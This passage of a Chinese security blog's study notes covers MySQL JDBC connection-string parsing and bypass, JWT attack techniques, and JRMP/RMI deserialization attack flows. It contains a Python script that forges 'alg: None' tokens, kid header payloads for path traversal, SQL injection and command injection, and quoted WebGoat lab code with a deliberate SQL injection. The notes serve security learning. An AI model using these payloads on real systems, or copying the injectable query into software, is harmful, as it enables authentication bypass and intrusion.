<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">parseConnectionString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">connString</span> <span class="operator">=</span> <span class="built_in">this</span>.baseConnectionString;</span><br><span class="line">    <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> CONNECTION_STRING_PTRN.matcher(connString);</span><br><span class="line">    <span class="keyword">if</span> (!matcher.matches()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (WrongArgumentException)ExceptionFactory.createException(WrongArgumentException.class, Messages.getString(<span class="string">&quot;ConnectionString.1&quot;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.scheme = decode(matcher.group(<span class="string">&quot;scheme&quot;</span>));</span><br><span class="line">        <span class="built_in">this</span>.authority = matcher.group(<span class="string">&quot;authority&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.path = matcher.group(<span class="string">&quot;path&quot;</span>) == <span class="literal">null</span> ? <span class="literal">null</span> : decode(matcher.group(<span class="string">&quot;path&quot;</span>)).trim();</span><br><span class="line">        <span class="built_in">this</span>.query = matcher.group(<span class="string">&quot;query&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>path部分也进⾏了⼀次decode⽅法处理，此外还进⾏了trim⽅法处理，但⽅法不能去除字符串中间的空⽩字符，所以只能进⾏ Urlencode绕过啦 </p>
<p>扩展参数Urlencode </p>
<p>在实例化SingleConnectionUrl对象时，会触发⽗类构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">ConnectionUrl</span><span class="params">(ConnectionUrlParser connStrParser, Properties info)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.originalConnStr = connStrParser.getDatabaseUrl();</span><br><span class="line">    <span class="built_in">this</span>.originalDatabase = connStrParser.getPath() == <span class="literal">null</span> ? <span class="string">&quot;&quot;</span> : connStrParser.getPath();</span><br><span class="line">    <span class="built_in">this</span>.collectProperties(connStrParser, info);</span><br><span class="line">    <span class="built_in">this</span>.collectHostsInfo(connStrParser);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会调⽤collectProperties⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">collectProperties</span><span class="params">(ConnectionUrlParser connStrParser, Properties info)</span> &#123;</span><br><span class="line">    connStrParser.getProperties().entrySet().stream().forEach((e) -&gt; &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var10000</span> <span class="operator">=</span> (String)<span class="built_in">this</span>.properties.put(PropertyKey.normalizeCase((String)e.getKey()), e.getValue());</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">if</span> (info != <span class="literal">null</span>) &#123;</span><br><span class="line">        info.stringPropertyNames().stream().forEach((k) -&gt; &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">var10000</span> <span class="operator">=</span> (String)<span class="built_in">this</span>.properties.put(PropertyKey.normalizeCase(k), info.getProperty(k));</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.processColdFusionAutoConfiguration();</span><br><span class="line">    <span class="built_in">this</span>.setupPropertiesTransformer();</span><br><span class="line">    <span class="built_in">this</span>.expandPropertiesFromConfigFiles(<span class="built_in">this</span>.properties);</span><br><span class="line">    <span class="built_in">this</span>.injectPerTypeProperties(<span class="built_in">this</span>.properties);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进getProperties⽅法，会⼀直调⽤到parseQuerySection⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Map&lt;String, String&gt; <span class="title function_">getProperties</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.parsedProperties == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.parseQuerySection();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Collections.unmodifiableMap(<span class="built_in">this</span>.parsedProperties);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>⽅法判断URL是否存在扩展参数，存在则调⽤processKeyValuePattern⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">parseQuerySection</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isNullOrEmpty(<span class="built_in">this</span>.query)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.parsedProperties = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.parsedProperties = <span class="built_in">this</span>.processKeyValuePattern(PROPERTIES_PTRN, <span class="built_in">this</span>.query);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(kvMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>(); matcher.find(); p = matcher.end()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (matcher.start() != p) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (WrongArgumentException)ExceptionFactory.createException(WrongArgumentException.class, Messages.getString(<span class="string">&quot;ConnectionString.4&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;input.substring(p)&#125;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> decode(StringUtils.safeTrim(matcher.group(<span class="string">&quot;key&quot;</span>)));</span><br><span class="line">    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> decode(StringUtils.safeTrim(matcher.group(<span class="string">&quot;value&quot;</span>)));</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>分离key和value，然后进⾏⼀次Urldecode，同样可以进⾏Urlencode编码</p>
<p>Key Value </p>
<p>com.mysql.cj.conf.BooleanPropertyDefinition的AllowableValue枚举类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">enum</span> <span class="title class_">AllowableValues</span> &#123;</span><br><span class="line">    TRUE(<span class="literal">true</span>),</span><br><span class="line">    FALSE(<span class="literal">false</span>),</span><br><span class="line">    YES(<span class="literal">true</span>),</span><br><span class="line">    NO(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>所以设置TRUE和设置YES是⼀样的 解析时还会转⼤写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Boolean <span class="title function_">parseObject</span><span class="params">(String value, ExceptionInterceptor exceptionInterceptor)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> BooleanPropertyDefinition.AllowableValues.valueOf(value.toUpperCase()).asBoolean();</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>jwt攻击</title>
    <url>/2023/06/20/jwt/</url>
    <content><![CDATA[<h1 id="一、JTW的结构"><a href="#一、JTW的结构" class="headerlink" title="一、JTW的结构"></a>一、JTW的结构</h1><p>JWT分别由标头(Header)、有效载荷(Payload)和签名(Signature)三个部分组成，采用base64url编码进行加密，以.作为连接的字符串形式。</p>
<p>base64url编码加密是先做base64加密，然后再将 <code>+ </code>改成 <code>-</code>、 &#x2F; 改成 _ ，同时也去除末尾额外添加的 <code>=</code> 字符</p>
<h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p>header部分承载两部分信息：</p>
<p>一个是typ，表示令牌类型</p>
<p>一个是alg，表示签名所使用的算法，默认是 HMAC SHA256</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>payload部分是JWT的主体部分，用于存放有效数据。包含三个部分</p>
<ul>
<li>标准中注册的声明</li>
<li>公共的声明</li>
<li>私有的声明</li>
</ul>
<p><strong>标准中注册的声明</strong>  ：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">iss：发行人</span><br><span class="line">exp：到期时间</span><br><span class="line">sub：jwt所面向的用户</span><br><span class="line">aud： 接收jwt的一方</span><br><span class="line">nbf：在此之前不可用</span><br><span class="line">iat：发布时间</span><br><span class="line"></span><br><span class="line">jti：JWT ID用于标识该JWT</span><br><span class="line">此jwt的唯一标识。通常用于解决请求中的重放攻击。该字段在大多数地方没有被提及或使用。因为使用此字段就意味着必须要在服务器维护一张jti表， 当客户端携带jwt访问的时候需要在jti表中查找这个唯一标识是否被使用过。</span><br></pre></td></tr></table></figure>

<p><strong>公共的声明</strong> ：<br>公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密.</p>
<p>格式与上面一样</p>
<h2 id="Signature-签名"><a href="#Signature-签名" class="headerlink" title="Signature(签名)"></a>Signature(签名)</h2><p>Signature部分是将前面用base64加密后的header和用base64加密后的payload通过<code>.</code>拼接起来，然后再用header声明所使用的算法（HS256）进行进行加盐secret加密，然后再对所得到的密文进行base64url加密，最终才得出JWT的第三部分。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">    base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> +base64UrlEncode(payload)<span class="punctuation">,</span></span><br><span class="line">    your<span class="number">-256</span>-bit-secret</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h1 id="二、JWT攻击方式"><a href="#二、JWT攻击方式" class="headerlink" title="二、JWT攻击方式"></a>二、JWT攻击方式</h1><ol>
<li><p>空加密算法<br>前提：服务端允许使用”alg” : “None”（几乎不可能，一般只存在靶场中）<br>方法：将header部分的alg改为None，删除掉Signature部分</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64urlencode</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(data).replace(<span class="string">b&#x27;+&#x27;</span>, <span class="string">b&#x27;-&#x27;</span>).replace(<span class="string">b&#x27;/&#x27;</span>, <span class="string">b&#x27;_&#x27;</span>).replace(<span class="string">b&#x27;=&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64urlencode(<span class="string">b&#x27;&#123;&quot;alg&quot;:&quot;None&quot;&#125;&#x27;</span>)+<span class="string">b&#x27;.&#x27;</span>+base64urlencode(<span class="string">b&#x27;&#123;&quot;iat&quot;: ,&quot;name&quot;:admin&quot;&#125;&#x27;</span>)+<span class="string">b&#x27;.&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改RSA加密算法为HMAC<br>JWT中最常用的两种算法为<code>HMAC</code>和<code>RSA</code>。</p>
<p>RSA则是一种非对称加密算法，使用私钥加密明文，公钥解密密文。</p>
<p>在HMAC和RSA算法中，都是使用私钥对signature字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token。</p>
<p>一个Web应用，在JWT传输过程中使用RSA算法，密钥pem对JWT token进行签名，公钥pub对签名进行验证。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;alg&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;RS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;typ&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;jwt&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>通常情况下密钥是无法获取到的，但是公钥却可以很容易通过某些途径读取到，这时，将JWT的加密算法修改为HMAC，即</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;alg&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;typ&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;jwt&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>同时使用获取到的公钥<code>pub</code>作为算法的密钥，对token进行签名，发送到服务器端。</p>
<p>服务器端会将RSA的公钥（<code>pub</code>）视为当前算法（HMAC）的密钥，使用HS256算法对接收到的签名进行验证。</p>
</li>
<li><p>密钥爆破工具<br>JWT 的密钥爆破需要在一定的前提下进行：</p>
<ul>
<li>知悉JWT使用的加密算法</li>
<li>一段有效的、已签名的token</li>
<li>签名用的密钥不复杂（弱密钥）</li>
</ul>
<p><code>https://github.com/brendan-rius/c-jwt-cracker</code></p>
</li>
<li><p>表头注入<br>通过jwk参数注入自签名的JWT<br>JWK英文全称为JSON Web Key，是一个IJSON对象，表示一个加密的密钥，他不同于alg属性，JWK是可选的，以下就是一个示例</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;jwk&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;kty&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RSA&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;e&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AQAB&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;n&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>靶场 Lab: JWT authentication bypass via jwk header injection</p>
<ul>
<li><p>在理想情况下，服务器应该是只使用公钥白名单来验证JWT签名的，但对于一些相关配置错误的服务器会用JWK参数中嵌入的任何密钥进行验证，攻击者就可以利用这一行为，用自己的RSA私钥对修改过的JWT进行签名，然后在JWK头部中嵌入对应的公钥进行越权操作</p>
<p>o(╥﹏╥)o还有其他标签头太难了</p>
</li>
</ul>
<p><code>kid</code>参数用于读取密钥文件，但系统并不会知道用户想要读取的到底是不是密钥文件，所以，如果在没有对参数进行过滤的前提下，攻击者是可以读取到系统的任意文件的。</p>
<p>当用户可以操控它的时候，容易引发以下安全问题：<br>目录遍历</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">       <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../etc/passwd&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>sql注入</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;111&#x27; || union select database() --&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>命令执行</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG&quot;</span> | whoami;</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><h4 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h4><p>项目地址： <a href="https://hub.docker.com/r/webgoat/webgoat-8.0/">https://hub.docker.com/r/webgoat/webgoat-8.0/</a><br>拉取：docker pull webgoat&#x2F;webgoat-8.0<br>启动：docker run -p 映射端口:8080 -t webgoat&#x2F;webgoat-8.0</p>
<p>还有个靶场太难了o(╥﹏╥)o burpsuite官方靶场</p>
<h4 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h4><p>jwt在线解密：<a href="https://jwt.io/">https://jwt.io/</a><br>时间戳生成网址：<a href="https://tool.chinaz.com/tools/unixtime.aspx">https://tool.chinaz.com/tools/unixtime.aspx</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AttackResult <span class="title function_">resetVotes</span><span class="params">(<span class="meta">@RequestParam(&quot;token&quot;)</span> String token)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isEmpty(token)) &#123;</span><br><span class="line">        <span class="keyword">return</span> trackProgress(failed().feedback(<span class="string">&quot;jwt-invalid-token&quot;</span>).build());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> String[] errorMessage = &#123;<span class="literal">null</span>&#125;;</span><br><span class="line">            <span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKeyResolver(<span class="keyword">new</span> <span class="title class_">SigningKeyResolverAdapter</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="type">byte</span>[] resolveSigningKeyBytes(JwsHeader header, Claims claims) &#123;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">kid</span> <span class="operator">=</span> (String) header.get(<span class="string">&quot;kid&quot;</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DatabaseUtilities.getConnection(webSession);</span><br><span class="line">                        <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> connection.createStatement().executeQuery(<span class="string">&quot;SELECT key FROM jwt_keys WHERE id = &#x27;&quot;</span> + kid + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">                        <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                            <span class="keyword">return</span> TextCodec.BASE64.decode(rs.getString(<span class="number">1</span>));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                        errorMessage[<span class="number">0</span>] = e.getMessage();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).parse(token);</span><br><span class="line">            <span class="keyword">if</span> (errorMessage[<span class="number">0</span>] != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> trackProgress(failed().output(errorMessage[<span class="number">0</span>]).build());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> (Claims) jwt.getBody();</span><br><span class="line">            <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> (String) claims.get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;Jerry&quot;</span>.equals(username)) &#123;</span><br><span class="line">                <span class="keyword">return</span> trackProgress(failed().feedback(<span class="string">&quot;jwt-final-jerry-account&quot;</span>).build());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;Tom&quot;</span>.equals(username)) &#123;</span><br><span class="line">                <span class="keyword">return</span> trackProgress(success().build());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> trackProgress(failed().feedback(<span class="string">&quot;jwt-final-not-tom&quot;</span>).build());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> trackProgress(failed().feedback(<span class="string">&quot;jwt-invalid-token&quot;</span>).output(e.toString()).build());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code> ResultSet rs = connection.createStatement().executeQuery(&quot;SELECT key FROM jwt_keys WHERE id = &#39;&quot; + kid + &quot;&#39;&quot;);</code></p>
<p>重点是这存在sql注入</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>jrmp反序列化</title>
    <url>/2023/07/30/jrmp/</url>
    <content><![CDATA[<h4 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h4><p>RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，基于TCP&#x2F;IP之上，RMI协议之下，当需要进行RMI远程方法调用通信的时候要求服务端与客户端都为Java编写。</p>
<p>这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范，RMI底层默认使用的JRMP进行传递数据，并且JRMP协议只能作用于RMI协议。</p>
<p>当然RMI支持的协议除了JRMP还有IIOP协议，而在Weblogic里面的T3协议就是基于RMI去进行实现的。</p>
<p>JRMP协议(Java Remote Message Protocol)：RMI专用的Java远程消息交换协议。</p>
<p>IIOP协议(Internet Inter-ORB Protocol) ：基于 CORBA 实现的对象请求代理协议。</p>
<h3 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h3><p>前面是使用的类将payload进行封装这种方法在后面的补丁中已经将前面两个用到的补丁给拉入了黑名单，而在该漏洞中使用采用了远程的方式来进行命令执行。我们会在服务器搭建一个JRMPListener服务，然后通过T3协议发送payload，使得weblogic自动请求我们的JRMPListener，而在这时候JRMPListener会返回一个gadgets对象。JRMP基于RMI之下的协议，在传输过程其实传输的序列化数据，在接收完成后会去进行反序列化操作。这么在返回gadgets对象的时候，就会对我们的gadgets对象进行反序列化。达到命令执行的效果。也绕过了黑名单的限制。</p>
<p><a href="https://www.cnblogs.com/zpchcbd/p/14934168.html">https://www.cnblogs.com/zpchcbd/p/14934168.html</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/14275298.html">https://www.cnblogs.com/nice0e3/p/14275298.html</a></p>
<h1 id="JRMP-Listener-Client"><a href="#JRMP-Listener-Client" class="headerlink" title="JRMP Listener&#x2F;Client"></a>JRMP Listener&#x2F;Client</h1><h2 id="关于JRMP的两种攻击流程如下"><a href="#关于JRMP的两种攻击流程如下" class="headerlink" title="关于JRMP的两种攻击流程如下"></a>关于JRMP的两种攻击流程如下</h2><h3 id="第一种攻击方式"><a href="#第一种攻击方式" class="headerlink" title="第一种攻击方式"></a>第一种攻击方式</h3><p>个人理解：基于RMI的反序列化中的客户端打服务端的类型</p>
<p>我们需要先发送指定的payload（JRMPListener）到存在漏洞的服务器中，使得该服务器反序列化完成我们的payload后会开启一个RMI的服务监听在设置的端口上。</p>
<p>我们还需要在我们自己的服务器使用exploit（JRMPClient）与存在漏洞的服务器进行通信，并且发送一个利用链，达到一个命令执行的效果。</p>
<p>简单来说就是将一个payload（JRMPListener）发送到存在漏洞的服务器，存在漏洞的服务器反序列化操作该payload（JRMPListener）过后会在指定的端口开启RMI监听，然后再通过exploit（JRMPClient） 去发送利用链载荷，最终在存在漏洞的服务器上进行反序列化操作。</p>
<h3 id="第二种攻击方式"><a href="#第二种攻击方式" class="headerlink" title="第二种攻击方式"></a>第二种攻击方式</h3><p>个人理解：基于RMI的反序列化中的服务端打客户端的类型，这种攻击方式在实战中比较常用</p>
<p>将exploit（JRMPListener）作为攻击方进行监听。</p>
<p>我们发送指定的payloads（JRMPClient）使得存在漏洞的服务器向我们的exploit（JRMPListener）进行连接，连接后exploit（JRMPListener）则会返回给存在漏洞的服务器序列化的对象，而存在漏洞的服务器接收到了则进行反序列化操作，从而进行命令执行的操作。</p>
<p>PS：这里的payload和exploit就是指的不同包下的JRMPListener和JRMPClient！</p>
<h1 id="第一种攻击方式-1"><a href="#第一种攻击方式-1" class="headerlink" title="第一种攻击方式"></a>第一种攻击方式</h1><p>payloads&#x2F;JRMPListener+exploit&#x2F;JRMPClient（客户端打服务端类型）</p>
<p>这里的话了解原理就从代码层面入手，这里学习的还是ysoserial的实现，这里先看playloads&#x2F;JRMPListener的实现，这里也就是第一种攻击方式，最终的实现效果就是 使得对方存在反序列化漏洞的服务器上启动RMI服务，使得我们能够发送攻击数据。</p>
<p>当前面的payloads&#x2F;JRMPListener作用了之后，那么对方就已经开启了RMI服务，我们就可以通过exploit&#x2F;JRMPClient发送gadgets来进行利用了（前提对方存在可以利用的gadgets）</p>
<h1 id="第二种攻击方式-1"><a href="#第二种攻击方式-1" class="headerlink" title="第二种攻击方式"></a>第二种攻击方式</h1><ol>
<li>RMIRegistryExploit是客户端发起RMI通信并发送恶意payload到正常注册中心（服务端），注册中心反序列化并执行恶意命令。</li>
<li>受害机第一次反序列化payloads.JRMPClient后向exploit.JRMPListener（相当于恶意注册中心）发起正常RMI通信，exploit.JRMPListener（恶意注册中心）发送恶意payload到客户端（受害机），客户端（受害机）第二次反序列化，执行真正的恶意命令。</li>
<li>RMI可以被反打，因为JRMP可以对打。</li>
</ol>
<h1 id="JEP290策略"><a href="#JEP290策略" class="headerlink" title="JEP290策略"></a>JEP290策略</h1><h2 id="checkAccess限制"><a href="#checkAccess限制" class="headerlink" title="checkAccess限制"></a>checkAccess限制</h2><p>首先先看对于注册端的sun.rmi.registry.RegistryImpl_Skel#dispatch的限制，加上了相关checkAccess方法的限制，该方法限制了bind&#x2F;rebind&#x2F;unbind等操作只能在本地进行，无法通过远程来进行bind&#x2F;rebind&#x2F;unbind，而其中的lookup和list还是可以远程操作</p>
<p>CheckAccess的策略有什么用呢？使得RMI服务，注册端和服务端需要在同一个地址上，比如下面的服务端绑定注册端服务的操作，可以看到就存在<code>RegistryImpl.checkAccess(&quot;Registry.bind&quot;);</code></p>
<p>首先先看对于注册端的sun.rmi.registry.RegistryImpl_Skel#dispatch的限制，加上了相关checkAccess方法的限制，该方法限制了bind&#x2F;rebind&#x2F;unbind等操作只能在本地进行，无法通过远程来进行bind&#x2F;rebind&#x2F;unbind，而其中的lookup和list还是可以远程操作</p>
<p>CheckAccess的策略有什么用呢？使得RMI服务，注册端和服务端需要在同一个地址上，比如下面的服务端绑定注册端服务的操作，可以看到就存在<code>RegistryImpl.checkAccess(&quot;Registry.bind&quot;);</code></p>
<p>获取客户端请求的ip，然后进行对比，如果是本地地址的话则进行存储allowedAccessCache，但是如果不是本地地址并且不在allowedAccessCache则直接抛出AccessException错误</p>
<h2 id="反序列化过滤器"><a href="#反序列化过滤器" class="headerlink" title="反序列化过滤器"></a>反序列化过滤器</h2><h3 id="ObjectInputStream-filterCheck白名单校验"><a href="#ObjectInputStream-filterCheck白名单校验" class="headerlink" title="ObjectInputStream#filterCheck白名单校验"></a>ObjectInputStream#filterCheck白名单校验</h3><p>RMI通信反序列化新增了java.io.ObjectInputStream#filterCheck，只有符合如下的类的才能够允许RMI通信反序列化，否则直接抛出异常</p>
